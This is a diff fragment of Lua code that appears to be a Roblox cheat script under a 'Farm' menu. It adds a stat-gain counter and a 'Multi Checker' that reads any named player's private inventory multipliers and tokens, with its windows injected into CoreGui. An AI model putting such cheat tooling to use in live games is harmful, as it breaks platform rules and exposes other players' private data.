+        StatCounter.TimeFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.TimeFrameText.TextSize = 25.000
+        StatCounter.TimeFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.TimeFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.TimeFrameCorner.Name = 'TimeFrameCorner'
+        StatCounter.TimeFrameCorner.Parent = StatCounter.TimeFrame
+        
+        StatCounter.FsFrame.Name = 'Fs'
+        StatCounter.FsFrame.Parent = StatCounter.MainFrame
+        StatCounter.FsFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.FsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.FsFrame.BackgroundTransparency = 0.69
+        StatCounter.FsFrame.BorderSizePixel = 1
+        StatCounter.FsFrame.Position = UDim2.new(0.49, 0, 0.4, 0)
+        StatCounter.FsFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        StatCounter.FsFrameText.Name = 'Fist'
+        StatCounter.FsFrameText.Parent = StatCounter.FsFrame
+        StatCounter.FsFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.FsFrameText.BackgroundTransparency = 1
+        StatCounter.FsFrameText.TextTransparency = 0
+        StatCounter.FsFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        StatCounter.FsFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        StatCounter.FsFrameText.Font = 'GothamBold'
+        StatCounter.FsFrameText.Text = ''
+        StatCounter.FsFrameText.TextScaled = true
+        StatCounter.FsFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.FsFrameText.TextSize = 25.000
+        StatCounter.FsFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.FsFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.FsFrameCorner.Name = 'FsFrameCorner'
+        StatCounter.FsFrameCorner.Parent = StatCounter.FsFrame
+        
+        StatCounter.BtFrame.Name = 'Body'
+        StatCounter.BtFrame.Parent = StatCounter.MainFrame
+        StatCounter.BtFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.BtFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.BtFrame.BackgroundTransparency = 0.69
+        StatCounter.BtFrame.BorderSizePixel = 1
+        StatCounter.BtFrame.Position = UDim2.new(0.49, 0, 0.63, 0)
+        StatCounter.BtFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        StatCounter.BtFrameText.Name = 'Body'
+        StatCounter.BtFrameText.Parent = StatCounter.BtFrame
+        StatCounter.BtFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.BtFrameText.BackgroundTransparency = 1
+        StatCounter.BtFrameText.TextTransparency = 0
+        StatCounter.BtFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        StatCounter.BtFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        StatCounter.BtFrameText.Font = 'GothamBold'
+        StatCounter.BtFrameText.Text = ''
+        StatCounter.BtFrameText.TextScaled = true
+        StatCounter.BtFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.BtFrameText.TextSize = 25.000
+        StatCounter.BtFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.BtFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.BtFrameCorner.Name = 'BtFrameCorner'
+        StatCounter.BtFrameCorner.Parent = StatCounter.BtFrame
+        
+        StatCounter.PpFrame.Name = 'Psychic'
+        StatCounter.PpFrame.Parent = StatCounter.MainFrame
+        StatCounter.PpFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.PpFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.PpFrame.BackgroundTransparency = 0.69
+        StatCounter.PpFrame.BorderSizePixel = 1
+        StatCounter.PpFrame.Position = UDim2.new(0.49, 0, 0.858, 0)
+        StatCounter.PpFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        StatCounter.PpFrameText.Name = 'Psychic'
+        StatCounter.PpFrameText.Parent = StatCounter.PpFrame
+        StatCounter.PpFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.PpFrameText.BackgroundTransparency = 1
+        StatCounter.PpFrameText.TextTransparency = 0
+        StatCounter.PpFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        StatCounter.PpFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        StatCounter.PpFrameText.Font = 'GothamBold'
+        StatCounter.PpFrameText.Text = ''
+        StatCounter.PpFrameText.TextScaled = true
+        StatCounter.PpFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.PpFrameText.TextSize = 25.000
+        StatCounter.PpFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.PpFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.PpFrameCorner.Name = 'PpFrameCorner'
+        StatCounter.PpFrameCorner.Parent = StatCounter.PpFrame
+        
+        StatCounter.MsFrame.Name = 'Speed'
+        StatCounter.MsFrame.Parent = StatCounter.MainFrame
+        StatCounter.MsFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.MsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.MsFrame.BackgroundTransparency = 0.69
+        StatCounter.MsFrame.BorderSizePixel = 1
+        StatCounter.MsFrame.Position = UDim2.new(0.97, 0, 0.4, 0)
+        StatCounter.MsFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        StatCounter.MsFrameText.Name = 'Speed'
+        StatCounter.MsFrameText.Parent = StatCounter.MsFrame
+        StatCounter.MsFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.MsFrameText.BackgroundTransparency = 1
+        StatCounter.MsFrameText.TextTransparency = 0
+        StatCounter.MsFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        StatCounter.MsFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        StatCounter.MsFrameText.Font = 'GothamBold'
+        StatCounter.MsFrameText.Text = ''
+        StatCounter.MsFrameText.TextScaled = true
+        StatCounter.MsFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.MsFrameText.TextSize = 25.000
+        StatCounter.MsFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.MsFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.MsFrameCorner.Name = 'MsFrameCorner'
+        StatCounter.MsFrameCorner.Parent = StatCounter.MsFrame
+        
+        StatCounter.JfFrame.Name = 'Jump'
+        StatCounter.JfFrame.Parent = StatCounter.MainFrame
+        StatCounter.JfFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.JfFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.JfFrame.BackgroundTransparency = 0.69
+        StatCounter.JfFrame.BorderSizePixel = 1
+        StatCounter.JfFrame.Position = UDim2.new(0.97, 0, 0.63, 0)
+        StatCounter.JfFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        StatCounter.JfFrameText.Name = 'Jump'
+        StatCounter.JfFrameText.Parent = StatCounter.JfFrame
+        StatCounter.JfFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.JfFrameText.BackgroundTransparency = 1
+        StatCounter.JfFrameText.TextTransparency = 0
+        StatCounter.JfFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        StatCounter.JfFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        StatCounter.JfFrameText.Font = 'GothamBold'
+        StatCounter.JfFrameText.Text = ''
+        StatCounter.JfFrameText.TextScaled = true
+        StatCounter.JfFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.JfFrameText.TextSize = 25.000
+        StatCounter.JfFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.JfFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.JfFrameCorner.Name = 'JfFrameCorner'
+        StatCounter.JfFrameCorner.Parent = StatCounter.JfFrame
+        
+        StatCounter.TokensFrame.Name = 'Tokens'
+        StatCounter.TokensFrame.Parent = StatCounter.MainFrame
+        StatCounter.TokensFrame.AnchorPoint = Vector2.new(1, 0.5)
+        StatCounter.TokensFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        StatCounter.TokensFrame.BackgroundTransparency = 0.69
+        StatCounter.TokensFrame.BorderSizePixel = 1
+        StatCounter.TokensFrame.Position = UDim2.new(0.97, 0, 0.858, 0)
+        StatCounter.TokensFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        StatCounter.TokensFrameText.Name = 'Tokens'
+        StatCounter.TokensFrameText.Parent = StatCounter.TokensFrame
+        StatCounter.TokensFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        StatCounter.TokensFrameText.BackgroundTransparency = 1
+        StatCounter.TokensFrameText.TextTransparency = 0
+        StatCounter.TokensFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        StatCounter.TokensFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        StatCounter.TokensFrameText.Font = 'GothamBold'
+        StatCounter.TokensFrameText.Text = ''
+        StatCounter.TokensFrameText.TextScaled = true
+        StatCounter.TokensFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        StatCounter.TokensFrameText.TextSize = 25.000
+        StatCounter.TokensFrameText.TextXAlignment = Enum.TextXAlignment.Left
+        
+        StatCounter.TokensFrameCorner.CornerRadius = UDim.new(0, 10)
+        StatCounter.TokensFrameCorner.Name = 'TokensFrameCorner'
+        StatCounter.TokensFrameCorner.Parent = StatCounter.TokensFrame
+        
+        StatCounter.CloseButton.Name = 'CloseButton'
+        StatCounter.CloseButton.Parent = StatCounter.MainFrame
+        StatCounter.CloseButton.AnchorPoint = Vector2.new(0.5, 0.5)
+        StatCounter.CloseButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        StatCounter.CloseButton.BackgroundTransparency = 1
+        StatCounter.CloseButton.Position = UDim2.new(0.95, 0, 0.08, 0)
+        StatCounter.CloseButton.Size = UDim2.new(0.1, 0, 0.15, 0)
+        StatCounter.CloseButton.Active = false
+        StatCounter.CloseButton.Text = 'X'
+        StatCounter.CloseButton.TextColor3 = Color3.fromRGB(100, 100, 100)
+        StatCounter.CloseButton.TextSize = 24
+        StatCounter.CloseButton.Font = 'GothamBold'
+        StatCounter.CloseButton.AutoButtonColor = false
+        StatCounter.CloseButton.MouseButton1Click:connect(function()
+            StatCounter.StatCounterGui:Destroy()
+        end)
+        
+        local starttime = os.time()
+        
+        local function updatetime()
+            StatCounter.TimeFrameText.Text = 'Time: ' .. formattime(os.time() - starttime)
+        end
+        
+        local updating_stats = {
+            {StatCounter.FsFrameText, 'FistStrength', LocalPlayer:FindFirstChild('PrivateStats').FistStrength.Value}, 
+            {StatCounter.BtFrameText, 'BodyToughness', LocalPlayer:FindFirstChild('PrivateStats').BodyToughness.Value}, 
+            {StatCounter.PpFrameText, 'PsychicPower', LocalPlayer:FindFirstChild('PrivateStats').PsychicPower.Value}, 
+            {StatCounter.MsFrameText, 'MovementSpeed', LocalPlayer:FindFirstChild('PrivateStats').MovementSpeed.Value}, 
+            {StatCounter.JfFrameText, 'JumpForce', LocalPlayer:FindFirstChild('PrivateStats').JumpForce.Value}, 
+            {StatCounter.TokensFrameText, 'Token', LocalPlayer:FindFirstChild('PrivateStats').Token.Value}
+        }
+        
+        local old_value = 0;
+        local all_tokens = 0;
+        
+        for _, v in updating_stats do
+            v[1].Text = v[1].Name .. ': 0'
+            
+            if v[2] ~= 'Token' then
+                LocalPlayer:FindFirstChild('PrivateStats')[v[2]]:GetPropertyChangedSignal('Value'):Connect(function()
+                    v[1].Text = v[1].Name .. ': ' .. converttoletter(LocalPlayer:FindFirstChild('PrivateStats')[v[2]].Value - v[3])
+                end)
+            else
+                LocalPlayer:FindFirstChild('PrivateStats')[v[2]]:GetPropertyChangedSignal('Value'):Connect(function()
+                    if LocalPlayer:FindFirstChild('PrivateStats')[v[2]].Value - old_value > 0 then
+                        all_tokens = all_tokens + 5
+                    end
+                    old_value = LocalPlayer:FindFirstChild('PrivateStats')[v[2]].Value
+                    v[1].Text = v[1].Name .. ': ' .. converttoletter(all_tokens)
+                end)
+            end
+        end
+        
+        task.spawn(function()
+            while task.wait(0.1) do
+                updatetime()
+            end
+        end)
+    end,
+})
+
+Farm:CreateButton({
+    Name = 'Multi Checker',
+    Callback = function()
+        for _, v in pairs(game.CoreGui:GetChildren()) do
+            if v.Name == 'MultiChecker' then
+                v:Destroy()
+            end
+        end
+        local MultiChecker = {
+            MultiCheckerGui = Instance.new('ScreenGui'),
+            MainFrame = Instance.new('TextButton'),
+            MainFrameCorner = Instance.new('UICorner'),
+            PlayerNameFrame = Instance.new('Frame'),
+            PlayerNameFrameCorner = Instance.new('UICorner'),
+            PlayerTextBox = Instance.new('TextBox'),
+            PlayerTextBoxConstraint = Instance.new('UITextSizeConstraint'),
+            FsFrame = Instance.new('Frame'),
+            FsFrameText = Instance.new('TextLabel'),
+            FsFrameCorner = Instance.new('UICorner'),
+            BtFrame = Instance.new('Frame'),
+            BtFrameText = Instance.new('TextLabel'),
+            BtFrameCorner = Instance.new('UICorner'),
+            PpFrame = Instance.new('Frame'),
+            PpFrameText = Instance.new('TextLabel'),
+            PpFrameCorner = Instance.new('UICorner'),
+            MsFrame = Instance.new('Frame'),
+            MsFrameText = Instance.new('TextLabel'),
+            MsFrameCorner = Instance.new('UICorner'),
+            JfFrame = Instance.new('Frame'),
+            JfFrameText = Instance.new('TextLabel'),
+            JfFrameCorner = Instance.new('UICorner'),
+            TokensFrame = Instance.new('Frame'),
+            TokensFrameText = Instance.new('TextLabel'),
+            TokensFrameCorner = Instance.new('UICorner'),
+            CloseButton = Instance.new('TextButton')
+        }
+        
+        MultiChecker.MultiCheckerGui.Name = 'MultiChecker'
+        MultiChecker.MultiCheckerGui.Parent = game.CoreGui
+        MultiChecker.MultiCheckerGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+        MultiChecker.MultiCheckerGui.ResetOnSpawn = false
+        
+        MultiChecker.MainFrame.Name = 'MainFrame'
+        MultiChecker.MainFrame.Parent = MultiChecker.MultiCheckerGui
+        MultiChecker.MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+        MultiChecker.MainFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        MultiChecker.MainFrame.BackgroundTransparency = 0.1
+        MultiChecker.MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+        MultiChecker.MainFrame.Size = UDim2.new(0.25, 0, 0.28, 0)
+        MultiChecker.MainFrame.Active = false
+        MultiChecker.MainFrame.Text = ''
+        MultiChecker.MainFrame.AutoButtonColor = false
+        MultiChecker.MainFrame.MouseButton1Down:Connect(function()
+            local Mx, My = LocalPlayer:GetMouse().X, LocalPlayer:GetMouse().Y
+            local MouseMove, MouseKill
+            MouseMove = LocalPlayer:GetMouse().Move:Connect(function()
+                local nMx, nMy = LocalPlayer:GetMouse().X, LocalPlayer:GetMouse().Y
+                local Dx, Dy = nMx - Mx, nMy - My
+                MultiChecker.MainFrame.Position = MultiChecker.MainFrame.Position + UDim2.fromOffset(Dx, Dy)
+                Mx, My = nMx, nMy
+            end)
+            MouseKill = UserInputService.InputEnded:Connect(function(UserInput)
+                if UserInput.UserInputType == Enum.UserInputType.MouseButton1 then
+                    MouseMove:Disconnect()
+                    MouseKill:Disconnect()
+                end
+            end)
+        end)
+        
+        MultiChecker.MainFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.MainFrameCorner.Name = 'MainFrameCorner'
+        MultiChecker.MainFrameCorner.Parent = MultiChecker.MainFrame
+        
+        MultiChecker.PlayerNameFrame.Name = 'PlayerNameFrame'
+        MultiChecker.PlayerNameFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.PlayerNameFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+        MultiChecker.PlayerNameFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        MultiChecker.PlayerNameFrame.BackgroundTransparency = 0.5
+        MultiChecker.PlayerNameFrame.Position = UDim2.new(0.5, 0, 0.15, 0)
+        MultiChecker.PlayerNameFrame.Size = UDim2.new(0.6, 0, 0.15, 0)
+        
+        MultiChecker.PlayerNameFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.PlayerNameFrameCorner.Name = 'PlayerNameFrameCorner'
+        MultiChecker.PlayerNameFrameCorner.Parent = MultiChecker.PlayerNameFrame
+        
+        MultiChecker.PlayerTextBox.Name = 'PlayerTextBox'
+        MultiChecker.PlayerTextBox.Parent = MultiChecker.PlayerNameFrame
+        MultiChecker.PlayerTextBox.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.PlayerTextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+        MultiChecker.PlayerTextBox.BackgroundTransparency = 1.000
+        MultiChecker.PlayerTextBox.Position = UDim2.new(1, 0, 0.5, 0)
+        MultiChecker.PlayerTextBox.Size = UDim2.new(1, 0, 1, 0)
+        MultiChecker.PlayerTextBox.Font = 'GothamBold'
+        MultiChecker.PlayerTextBox.PlaceholderText = 'Enter Username Here'
+        MultiChecker.PlayerTextBox.Text = ''
+        MultiChecker.PlayerTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+        MultiChecker.PlayerTextBox.TextScaled = true
+        MultiChecker.PlayerTextBox.TextSize = 16
+        MultiChecker.PlayerTextBox.TextWrapped = true
+        MultiChecker.PlayerTextBox.ClearTextOnFocus = true
+        MultiChecker.PlayerTextBox.FocusLost:connect(function()
+            pcall(function()
+                for _, v in pairs(Players:GetPlayers()) do
+                    if (string.sub(string.lower(v.Name), 1, string.len(MultiChecker.PlayerTextBox.Text))) == string.lower(MultiChecker.PlayerTextBox.Text) then
+                        MultiChecker.PlayerTextBox.Text = v.Name
+                        local Multiplier = HttpService:JSONDecode(Players[MultiChecker.PlayerTextBox.Text]:FindFirstChild('PrivateStats').Inventory.Value)
+                        MultiChecker.FsFrameText.Text = 'Fist: x' .. tostring(Multiplier.FSMultiplier) .. ''
+                        MultiChecker.BtFrameText.Text = 'Body: x' .. tostring(Multiplier.BTMultiplier) .. ''
+                        MultiChecker.PpFrameText.Text = 'Psychic: x' .. tostring(Multiplier.PPMultiplier) .. ''
+                        MultiChecker.MsFrameText.Text = 'Movement: x' .. tostring(Multiplier.MSMultiplier) .. ''
+                        MultiChecker.JfFrameText.Text = 'Jump: x' .. tostring(Multiplier.JFMultiplier) .. ''
+                        MultiChecker.TokensFrameText.Text = 'Tokens: ' .. converttoletter(Players[MultiChecker.PlayerTextBox.Text]:FindFirstChild('PrivateStats').Token.Value)
+                    end
+                end
+            end)
+        end)
+        
+        MultiChecker.PlayerTextBoxConstraint.Parent = MultiChecker.PlayerTextBox
+        MultiChecker.PlayerTextBoxConstraint.MaxTextSize = 20
+        
+        MultiChecker.FsFrame.Name = 'FsMulti'
+        MultiChecker.FsFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.FsFrame.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.FsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) 
+        MultiChecker.FsFrame.BackgroundTransparency = 0.69
+        MultiChecker.FsFrame.BorderSizePixel = 1
+        MultiChecker.FsFrame.Position = UDim2.new(0.49, 0, 0.4, 0)
+        MultiChecker.FsFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        MultiChecker.FsFrameText.Name = 'FsMultiText'
+        MultiChecker.FsFrameText.Parent = MultiChecker.FsFrame
+        MultiChecker.FsFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MultiChecker.FsFrameText.BackgroundTransparency = 1
+        MultiChecker.FsFrameText.TextTransparency = 0
+        MultiChecker.FsFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        MultiChecker.FsFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        MultiChecker.FsFrameText.Font = 'GothamBold'
+        MultiChecker.FsFrameText.Text = ''
+        MultiChecker.FsFrameText.TextScaled = true
+        MultiChecker.FsFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        MultiChecker.FsFrameText.TextSize = 25.000
+        MultiChecker.FsFrameText.TextXAlignment = Enum.TextXAlignment.Center
+        
+        MultiChecker.FsFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.FsFrameCorner.Name = 'FsFrameCorner'
+        MultiChecker.FsFrameCorner.Parent = MultiChecker.FsFrame
+        
+        MultiChecker.BtFrame.Name = 'BtMulti'
+        MultiChecker.BtFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.BtFrame.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.BtFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MultiChecker.BtFrame.BackgroundTransparency = 0.69
+        MultiChecker.BtFrame.BorderSizePixel = 1
+        MultiChecker.BtFrame.Position = UDim2.new(0.49, 0, 0.63, 0)
+        MultiChecker.BtFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        MultiChecker.BtFrameText.Name = 'BtMultiText'
+        MultiChecker.BtFrameText.Parent = MultiChecker.BtFrame
+        MultiChecker.BtFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MultiChecker.BtFrameText.BackgroundTransparency = 1
+        MultiChecker.BtFrameText.TextTransparency = 0
+        MultiChecker.BtFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        MultiChecker.BtFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        MultiChecker.BtFrameText.Font = 'GothamBold'
+        MultiChecker.BtFrameText.Text = ''
+        MultiChecker.BtFrameText.TextScaled = true
+        MultiChecker.BtFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        MultiChecker.BtFrameText.TextSize = 25.000
+        MultiChecker.BtFrameText.TextXAlignment = Enum.TextXAlignment.Center
+        
+        MultiChecker.BtFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.BtFrameCorner.Name = 'BtFrameCorner'
+        MultiChecker.BtFrameCorner.Parent = MultiChecker.BtFrame
+        
+        MultiChecker.PpFrame.Name = 'PpMulti'
+        MultiChecker.PpFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.PpFrame.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.PpFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MultiChecker.PpFrame.BackgroundTransparency = 0.69
+        MultiChecker.PpFrame.BorderSizePixel = 1
+        MultiChecker.PpFrame.Position = UDim2.new(0.49, 0, 0.858, 0)
+        MultiChecker.PpFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        MultiChecker.PpFrameText.Name = 'PpMultiText'
+        MultiChecker.PpFrameText.Parent = MultiChecker.PpFrame
+        MultiChecker.PpFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MultiChecker.PpFrameText.BackgroundTransparency = 1
+        MultiChecker.PpFrameText.TextTransparency = 0
+        MultiChecker.PpFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        MultiChecker.PpFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        MultiChecker.PpFrameText.Font = 'GothamBold'
+        MultiChecker.PpFrameText.Text = ''
+        MultiChecker.PpFrameText.TextScaled = true
+        MultiChecker.PpFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        MultiChecker.PpFrameText.TextSize = 25.000
+        MultiChecker.PpFrameText.TextXAlignment = Enum.TextXAlignment.Center
+        
+        MultiChecker.PpFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.PpFrameCorner.Name = 'PpFrameCorner'
+        MultiChecker.PpFrameCorner.Parent = MultiChecker.PpFrame
+        
+        MultiChecker.MsFrame.Name = 'MsMulti'
+        MultiChecker.MsFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.MsFrame.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.MsFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MultiChecker.MsFrame.BackgroundTransparency = 0.69
+        MultiChecker.MsFrame.BorderSizePixel = 1
+        MultiChecker.MsFrame.Position = UDim2.new(0.97, 0, 0.4, 0)
+        MultiChecker.MsFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        MultiChecker.MsFrameText.Name = 'MsMultiText'
+        MultiChecker.MsFrameText.Parent = MultiChecker.MsFrame
+        MultiChecker.MsFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MultiChecker.MsFrameText.BackgroundTransparency = 1
+        MultiChecker.MsFrameText.TextTransparency = 0
+        MultiChecker.MsFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        MultiChecker.MsFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        MultiChecker.MsFrameText.Font = 'GothamBold'
+        MultiChecker.MsFrameText.Text = ''
+        MultiChecker.MsFrameText.TextScaled = true
+        MultiChecker.MsFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        MultiChecker.MsFrameText.TextSize = 25.000
+        MultiChecker.MsFrameText.TextXAlignment = Enum.TextXAlignment.Center
+        
+        MultiChecker.MsFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.MsFrameCorner.Name = 'MsFrameCorner'
+        MultiChecker.MsFrameCorner.Parent = MultiChecker.MsFrame
+        
+        MultiChecker.JfFrame.Name = 'JfMulti'
+        MultiChecker.JfFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.JfFrame.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.JfFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MultiChecker.JfFrame.BackgroundTransparency = 0.69
+        MultiChecker.JfFrame.BorderSizePixel = 1
+        MultiChecker.JfFrame.Position = UDim2.new(0.97, 0, 0.63, 0)
+        MultiChecker.JfFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        MultiChecker.JfFrameText.Name = 'JfMultiText'
+        MultiChecker.JfFrameText.Parent = MultiChecker.JfFrame
+        MultiChecker.JfFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MultiChecker.JfFrameText.BackgroundTransparency = 1
+        MultiChecker.JfFrameText.TextTransparency = 0
+        MultiChecker.JfFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        MultiChecker.JfFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        MultiChecker.JfFrameText.Font = 'GothamBold'
+        MultiChecker.JfFrameText.Text = ''
+        MultiChecker.JfFrameText.TextScaled = true
+        MultiChecker.JfFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        MultiChecker.JfFrameText.TextSize = 25.000
+        MultiChecker.JfFrameText.TextXAlignment = Enum.TextXAlignment.Center
+        
+        MultiChecker.JfFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.JfFrameCorner.Name = 'JfFrameCorner'
+        MultiChecker.JfFrameCorner.Parent = MultiChecker.JfFrame
+        
+        MultiChecker.TokensFrame.Name = 'Tokens'
+        MultiChecker.TokensFrame.Parent = MultiChecker.MainFrame
+        MultiChecker.TokensFrame.AnchorPoint = Vector2.new(1, 0.5)
+        MultiChecker.TokensFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        MultiChecker.TokensFrame.BackgroundTransparency = 0.69
+        MultiChecker.TokensFrame.BorderSizePixel = 1
+        MultiChecker.TokensFrame.Position = UDim2.new(0.97, 0, 0.858, 0)
+        MultiChecker.TokensFrame.Size = UDim2.new(0.46, 0, 0.21, 0)
+        
+        MultiChecker.TokensFrameText.Name = 'TokensMultiText'
+        MultiChecker.TokensFrameText.Parent = MultiChecker.TokensFrame
+        MultiChecker.TokensFrameText.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+        MultiChecker.TokensFrameText.BackgroundTransparency = 1
+        MultiChecker.TokensFrameText.TextTransparency = 0
+        MultiChecker.TokensFrameText.Position = UDim2.new(0, 0, 0.28, 0)
+        MultiChecker.TokensFrameText.Size = UDim2.new(1, 0, 0.48, 0)
+        MultiChecker.TokensFrameText.Font = 'GothamBold'
+        MultiChecker.TokensFrameText.Text = ''
+        MultiChecker.TokensFrameText.TextScaled = true
+        MultiChecker.TokensFrameText.TextColor3 = Color3.fromRGB(233, 233, 233)
+        MultiChecker.TokensFrameText.TextSize = 25.000
+        MultiChecker.TokensFrameText.TextXAlignment = Enum.TextXAlignment.Center
+        
+        MultiChecker.TokensFrameCorner.CornerRadius = UDim.new(0, 10)
+        MultiChecker.TokensFrameCorner.Name = 'TokensFrameCorner'
+        MultiChecker.TokensFrameCorner.Parent = MultiChecker.TokensFrame
+        
+        MultiChecker.CloseButton.Name = 'CloseButton'
+        MultiChecker.CloseButton.Parent = MultiChecker.MainFrame
+        MultiChecker.CloseButton.AnchorPoint = Vector2.new(0.5, 0.5)
+        MultiChecker.CloseButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+        MultiChecker.CloseButton.BackgroundTransparency = 1
+        MultiChecker.CloseButton.Position = UDim2.new(0.95, 0, 0.08, 0)
+        MultiChecker.CloseButton.Size = UDim2.new(0.1, 0, 0.15, 0)
+        MultiChecker.CloseButton.Active = false
+        MultiChecker.CloseButton.Text = 'X'
+        MultiChecker.CloseButton.TextColor3 = Color3.fromRGB(100, 100, 100)
+        MultiChecker.CloseButton.TextSize = 24
+        MultiChecker.CloseButton.Font = 'GothamBold'
+        MultiChecker.CloseButton.AutoButtonColor = false
